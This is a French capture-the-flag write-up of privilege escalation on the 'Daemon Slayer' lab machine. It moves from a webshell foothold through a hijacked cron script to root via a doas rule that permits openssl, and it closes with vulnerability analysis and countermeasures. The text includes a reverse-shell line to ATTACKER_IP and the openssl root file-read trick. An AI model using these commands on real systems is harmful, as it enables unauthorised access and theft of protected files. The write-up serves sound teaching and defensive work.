---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-276 et CWE-732
---

# Élévation de privilèges — Daemon Slayer
# Élévation de privilèges — Daemon Slayer

## 1 / Contexte de départ

Après récupération du flag utilisateur (`user.txt`), on dispose d'un accès `www-data` sur la machine, obtenu via un webshell PHP uploadé sur le CMS "Demon Human Food Tracker".

On avait précédemment identifié un cron job exécuté en tant que `muzan` toutes les minutes :

```text
* * * * * muzan /var/www/scripts/immortality_check.sh
```

Le répertoire `/var/www/scripts/` appartenant à `www-data`, on peut remplacer librement le script qu'il contient.

---

## 2 / Obtention d'un shell interactif en tant que `muzan`

On remplace le script cron par un reverse shell, en une seule ligne pour éviter les soucis de buffering du shell netcat :

```bash
echo '#!/bin/bash' > /var/www/scripts/immortality_check.sh; echo 'bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1' >> /var/www/scripts/immortality_check.sh; chmod 755 /var/www/scripts/immortality_check.sh
```

On ouvre un listener sur un port dédié, différent du reverse shell `www-data` initial :

```bash
nc -lvnp 4445
```

Après un tick de cron (jusqu'à 60 secondes), on reçoit une connexion avec un shell `muzan` :

```bash
id
```

```text
uid=1000(muzan) gid=1000(muzan) groups=1000(muzan)
```

---

## 3 / Énumération des privilèges de `muzan`

On vérifie les règles `sudo` :

```bash
sudo -n -l 2>&1
```

```text
sudo: a password is required
```

Aucune règle `sudo` accessible sans mot de passe. On poursuit l'énumération avec les binaires SUID :

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/doas
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4
```

Deux binaires attirent l'attention : `doas` (équivalent OpenBSD de `sudo`, souvent mal configuré) et `exim4` (MTA avec un historique de CVE d'élévation de privilèges).

---

## 4 / Analyse de la configuration `doas`

On lit le fichier de configuration de `doas`, accessible en lecture par `muzan` :

```bash
cat /etc/doas.conf
```

On obtient :

```text
permit nopass muzan as root cmd openssl
```

Cette règle autorise `muzan` à exécuter `openssl` en tant que `root`, **sans mot de passe** et **sans restriction sur les arguments**.

---

## 5 / Exploitation de `openssl` via `doas`

`openssl enc` permet de lire un fichier en entrée (`-in`) et d'écrire un fichier en sortie (`-out`). Comme la commande est exécutée en tant que `root` via `doas`, elle a le droit de lire n'importe quel fichier du système — y compris `/root/root.txt`, inaccessible directement à `muzan`.

### Étape 1 — Lecture privilégiée déguisée en chiffrement

On demande à `openssl` (exécuté en `root`) de chiffrer le contenu du flag root avec un mot de passe choisi par nous, et d'écrire le résultat dans `/tmp`, un répertoire accessible en écriture/lecture par tous :

```bash
doas openssl enc -aes-256-cbc -salt -in /root/root.txt -out /tmp/root_enc -pass pass:pwn123 -e
```

On vérifie que le fichier chiffré a bien été créé :

```bash
ls -la /tmp/root_enc
```

```text
-rw-rw-r-- 1 root root 80 Sep 21 09:20 /tmp/root_enc
```

Bien que le fichier appartienne à `root`, ses permissions (`rw-rw-r--`) le rendent lisible par `muzan`.

### Étape 2 — Déchiffrement sans privilège

Le contenu étant chiffré avec un mot de passe qu'on connaît (`pwn123`), on peut le déchiffrer nous-mêmes, sans avoir besoin de `doas` ni de `root` :

```bash
openssl enc -aes-256-cbc -d -in /tmp/root_enc -pass pass:pwn123
```

Le flag root s'affiche en clair :

```text
EPI{1_w1ll_no7_7Rampl3_on_7h3_Pa1N5_of_B31n9_A_d3mon}
```

---

## 6 / Chaîne d'exploitation

```text
www-data (webshell)
    │
    │ Cron /var/www/scripts/immortality_check.sh
    │ Répertoire parent appartenant à www-data → remplacement par reverse shell
    ▼
muzan (shell interactif)
    │
    │ /etc/doas.conf : permit nopass muzan as root cmd openssl
    │ Aucune restriction d'arguments sur "openssl"
    ▼
doas openssl enc -in /root/root.txt -out /tmp/root_enc
    │
    │ openssl s'exécute en root → lit /root/root.txt
    │ écrit une copie chiffrée dans /tmp (accessible à muzan)
    ▼
openssl enc -d (déchiffrement sans privilège, mot de passe connu)
    │
    ▼
/root/root.txt (en clair)
```

---

## 7 / Vulnérabilités exploitées

### Cron job mal cloisonné (rappel de la phase user)

Un script exécuté par un utilisateur privilégié (`muzan`) se trouve dans un répertoire appartenant à un utilisateur moins privilégié (`www-data`), permettant son remplacement.

### Règle `doas` sans restriction d'arguments

```text
permit nopass muzan as root cmd openssl
```

Autoriser un binaire multifonction comme `openssl` sans restreindre ses arguments équivaut à donner un accès root quasi complet en lecture/écriture de fichiers. `openssl enc` devient alors un outil détournable pour lire n'importe quel fichier du système (technique répertoriée sur GTFOBins), même sans obtenir un shell root direct :
- `-in` permet de lire un fichier protégé (lu par le processus root).
- `-out` permet d'écrire le résultat vers un emplacement accessible par l'utilisateur non privilégié.
- Le chiffrement n'est qu'un vecteur pratique de transfert — un simple `doas cp` aurait eu le même effet si `cp` avait été autorisé à la place d'`openssl`.

## 8 / Contre-mesures

### Cron remplaçable

- Protéger le script cron et tous ses répertoires parents contre l'écriture par `www-data`.
- Vérifier régulièrement propriétaire, permissions et intégrité des scripts exécutés avec un autre compte.

### Règle `doas` sur `openssl`

- Ne pas autoriser un outil multifonction comme `openssl` sans restriction d'arguments.
- Remplacer la règle par un script dédié, avec des chemins source et destination fixes, non modifiable et journalisé.
- Éviter les écritures privilégiées dans `/tmp` ; utiliser un répertoire privé avec des permissions strictes.